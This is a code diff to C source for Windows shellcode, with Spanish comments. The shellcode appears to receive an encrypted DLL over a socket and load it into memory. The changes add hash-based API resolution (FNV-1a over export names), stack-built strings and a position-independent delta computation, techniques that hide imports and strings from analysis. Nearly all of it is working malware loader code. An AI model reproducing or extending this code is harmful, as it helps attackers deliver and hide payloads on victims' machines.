@@ -1,14 +1,38 @@
-﻿#include <windows.h>
+﻿#include "..\..\kPreprocessor\kPreprocessor.h"
+#include <windows.h>
 #include <winnt.h>
 #include <stdio.h>
 #include "main.h"
 
+DEFINE_PYSRC(
+def DEFINE_SHELLCODE_STR(a):
+    r = ""
+    for s in a:
+        r+= ("char s%s[] = {")%(s)
+        for c in s:
+            r+=("'%s',")%(c)
+        r+= "'\\0'};\n"
+    return r
+
+def FNV(s):
+    h = 2166136261
+    for c in s:
+        h^= ord(c)
+        h*= 16777619
+        h&= 0xFFFFFFFF
+
+    return h
+)DEFINE_END()
+
+#define DEFINE_SHELLCODE_STR(...) PYTHON_FUNCTION()
+#define FNV(...) PYTHON_FUNCTION()
+
 int main(int argc, char **argv);
-void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
-void Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY);
+void scInit(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY);
+void Start(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY);
 void Payload(PSHELLCODE_CONTEXT scc);
 
-void __declspec(naked) Start(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
+void __declspec(naked) Start(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY){
     __asm{
         jmp scInit
     }
@@ -123,7 +147,7 @@ void PerformBaseRelocation(PMEMORYMODULE module, DWORD delta){
 			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
 			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + sizeof(IMAGE_BASE_RELOCATION));
 
-			for (i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2); i++, relInfo++){
+			for (i=0; i<((relocation->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD)); i++, relInfo++){
 				DWORD *patchAddrHL;
 				int type, offset;
 
@@ -392,15 +416,49 @@ void __stdcall FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE modu
     pSCC->VirtualFree_(module->codeBase, 0, MEM_RELEASE);
 
     //Liberamos cada DLL cargada
-    for(int i=0; i<module->numModules;i++){
+    for(int i=0; i<module->numModules;i++)
         pSCC->FreeLibrary_(module->modules[i]);
-    }
 
     //Liberamos el array de modules
     pSCC->RtlFreeHeap_(pSCC->GetProcessHeap_(), 0, module->modules);
 }
 
 #pragma endregion
+
+ULONG fnv32(register const char *s){
+    register ULONG hash = 2166136261U;
+ 
+    while(*s)
+        hash = (hash ^ (*(s++)))*16777619;
+ 
+    return hash;
+}
+
+FARPROC WINAPI GetProcAddressByHash(HINSTANCE hModule,ULONG hash){
+    register PIMAGE_NT_HEADERS PE;
+    register FARPROC proc = NULL;
+    register PIMAGE_EXPORT_DIRECTORY ExpDir = NULL;
+    register char** ExportNames = NULL;
+ 
+    if(*((USHORT*)hModule)==IMAGE_DOS_SIGNATURE){
+        PE = (PIMAGE_NT_HEADERS)(((IMAGE_DOS_HEADER*)hModule)->e_lfanew+(ULONG)hModule);
+        if(PE->Signature == IMAGE_NT_SIGNATURE && PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size){
+            ExpDir = (PIMAGE_EXPORT_DIRECTORY)(PE->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(ULONG)hModule);
+            ExportNames = (char**)(ExpDir->AddressOfNames+(ULONG)hModule);
+            register int i;
+            for(i = 0;ExportNames[i];i++){
+                if(fnv32(ExportNames[i]+(ULONG)hModule) == hash){
+                    ULONG* funtionRVAs = (ULONG*)(ExpDir->AddressOfFunctions+(ULONG)hModule);
+                    USHORT* ordinalRVAs = (USHORT*)(ExpDir->AddressOfNameOrdinals+(ULONG)hModule);
+                    proc = (FARPROC)(funtionRVAs[ordinalRVAs[i]] +(ULONG)hModule);
+                    break;
+                }
+            }
+ 
+        }
+    }
+    return proc;
+}
 
 void Payload(PSHELLCODE_CONTEXT scc){
     bool  bReceived = false;
@@ -410,17 +468,6 @@ void Payload(PSHELLCODE_CONTEXT scc){
     //Generamos el OK
     char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
     scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));
-
-    DWORD d=0;
-    __asm{
-        call get_delta
-get_delta:
-        pop  eax
-        sub  eax, get_delta
-        mov  [d], eax
-    }
-
-    scc->delta = d;
 
     //Enviamos el OK al cliente.
     if (scc->send_(scc->hSocket, ok, sizeof(ok), 0) == sizeof(ok)){
@@ -504,42 +551,57 @@ get_delta:
     return;
 }
 
-void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYPTKEY hKEY){
-    #include "cadenas.h"
-    PSHELLCODE_CONTEXT  scc = (SHELLCODE_CONTEXT*)((_malloc)pGPA(pLoadLibA(sMSVCRT), smalloc))(sizeof(SHELLCODE_CONTEXT));
+FARPROC WINAPI GPA_WRAPPER(HMODULE hModule, LPCTSTR lpProcName){
+    return GetProcAddressByHash(hModule, fnv32(lpProcName));
+}
 
+void scInit(_LoadLibraryA pLoadLibA, SOCKET hSocket, HCRYPTKEY hKEY){
+    DEFINE_SHELLCODE_STR(["MSVCRT", "NTDLL", "KERNEL32", "WS2_32", "ADVAPI32"])
+
+    PSHELLCODE_CONTEXT  scc = (SHELLCODE_CONTEXT*)((_malloc)GetProcAddressByHash(pLoadLibA(sMSVCRT), FNV("malloc")))(sizeof(SHELLCODE_CONTEXT));
+
+    register DWORD d=0;
+    __asm{
+        call get_delta
+get_delta:
+        pop  eax
+        sub  eax, get_delta
+        mov  d, eax
+    }
+
+    scc->delta = d;
     scc->NTDLL              = pLoadLibA(sNTDLL);
-    scc->memcpy_            = (_memcpy)pGPA(scc->NTDLL, smemcpy);
-    scc->memset_            = (_memset)pGPA(scc->NTDLL, smemset);
-    scc->RtlAllocateHeap_   = (_RtlAllocateHeap)pGPA(scc->NTDLL, sRtlAllocateHeap);
-    scc->RtlReAllocateHeap_ = (_RtlReAllocateHeap)pGPA(scc->NTDLL, sRtlReAllocateHeap);
-    scc->RtlFreeHeap_       = (_RtlFreeHeap)pGPA(scc->NTDLL, sRtlFreeHeap);
+    scc->memcpy_            = (_memcpy)GetProcAddressByHash(scc->NTDLL, FNV("memcpy"));
+    scc->memset_            = (_memset)GetProcAddressByHash(scc->NTDLL, FNV("memset"));
+    scc->RtlAllocateHeap_   = (_RtlAllocateHeap)GetProcAddressByHash(scc->NTDLL, FNV("RtlAllocateHeap"));
+    scc->RtlReAllocateHeap_ = (_RtlReAllocateHeap)GetProcAddressByHash(scc->NTDLL, FNV("RtlReAllocateHeap"));
+    scc->RtlFreeHeap_       = (_RtlFreeHeap)GetProcAddressByHash(scc->NTDLL, FNV("RtlFreeHeap"));
 
     scc->KERNEL32           = pLoadLibA(sKERNEL32);
-    scc->FreeLibrary_       = (_FreeLibrary)pGPA(scc->KERNEL32, sFreeLibrary);
-    scc->VirtualAlloc_      = (_VirtualAlloc)pGPA(scc->KERNEL32, sVirtualAlloc);
-    scc->VirtualFree_       = (_VirtualFree)pGPA(scc->KERNEL32, sVirtualFree);
-    scc->VirtualProtect_    = (_VirtualProtect)pGPA(scc->KERNEL32, sVirtualProtect);
-    scc->GetProcessHeap_    = (_GetProcessHeap)pGPA(scc->KERNEL32, sGetProcessHeap);
-    scc->IsBadReadPtr_      = (_IsBadReadPtr)pGPA(scc->KERNEL32, sIsBadReadPtr);
-    scc->TlsAlloc_          = (_TlsAlloc)pGPA(scc->KERNEL32, sTlsAlloc);
-    scc->TlsFree_           = (_TlsFree)pGPA(scc->KERNEL32, sTlsFree);
-    scc->TlsSetValue_       = (_TlsSetValue)pGPA(scc->KERNEL32, sTlsSetValue);
-    scc->TlsGetValue_       = (_TlsGetValue)pGPA(scc->KERNEL32, sTlsGetValue);
+    scc->FreeLibrary_       = (_FreeLibrary)GetProcAddressByHash(scc->KERNEL32, FNV("FreeLibrary"));
+    scc->VirtualAlloc_      = (_VirtualAlloc)GetProcAddressByHash(scc->KERNEL32, FNV("VirtualAlloc"));
+    scc->VirtualFree_       = (_VirtualFree)GetProcAddressByHash(scc->KERNEL32, FNV("VirtualFree"));
+    scc->VirtualProtect_    = (_VirtualProtect)GetProcAddressByHash(scc->KERNEL32, FNV("VirtualProtect"));
+    scc->GetProcessHeap_    = (_GetProcessHeap)GetProcAddressByHash(scc->KERNEL32, FNV("GetProcessHeap"));
+    scc->IsBadReadPtr_      = (_IsBadReadPtr)GetProcAddressByHash(scc->KERNEL32, FNV("IsBadReadPtr"));
+    scc->TlsAlloc_          = (_TlsAlloc)GetProcAddressByHash(scc->KERNEL32, FNV("TlsAlloc"));
+    scc->TlsFree_           = (_TlsFree)GetProcAddressByHash(scc->KERNEL32, FNV("TlsFree"));
+    scc->TlsSetValue_       = (_TlsSetValue)GetProcAddressByHash(scc->KERNEL32, FNV("TlsSetValue"));
+    scc->TlsGetValue_       = (_TlsGetValue)GetProcAddressByHash(scc->KERNEL32, FNV("TlsGetValue"));
 
     scc->WS2_32             = pLoadLibA(sWS2_32);
-    scc->send_              = (_send)pGPA(scc->WS2_32, ssend);
-    scc->recv_              = (_recv)pGPA(scc->WS2_32, srecv);
+    scc->send_              = (_send)GetProcAddressByHash(scc->WS2_32, FNV("send"));
+    scc->recv_              = (_recv)GetProcAddressByHash(scc->WS2_32, FNV("recv"));
     scc->ADVAPI32           = pLoadLibA(sADVAPI32);
-    scc->CryptDecrypt_      = (_CryptDecrypt)pGPA(scc->ADVAPI32, sCryptDecrypt);
-    scc->CryptEncrypt_      = (_CryptEncrypt)pGPA(scc->ADVAPI32, sCryptEncrypt);
+    scc->CryptDecrypt_      = (_CryptDecrypt)GetProcAddressByHash(scc->ADVAPI32, FNV("CryptDecrypt"));
+    scc->CryptEncrypt_      = (_CryptEncrypt)GetProcAddressByHash(scc->ADVAPI32, FNV("CryptEncrypt"));
 
     scc->MSVCRT             = pLoadLibA(sMSVCRT);
-    scc->malloc__           = (_malloc)pGPA(scc->MSVCRT, smalloc);
-    scc->free_              = (_free)pGPA(scc->MSVCRT, sfree);
+    scc->malloc__           = (_malloc)GetProcAddressByHash(scc->MSVCRT, FNV("malloc"));
+    scc->free_              = (_free)GetProcAddressByHash(scc->MSVCRT, FNV("free"));
 
     scc->LoadLibraryA_      = pLoadLibA;
-    scc->GetProcAddressA_   = pGPA;
+    scc->GetProcAddressA_   = (_GetProcAddress)((PBYTE)GPA_WRAPPER+scc->delta);
     scc->hSocket            = hSocket;
     scc->hKey               = hKEY;
 
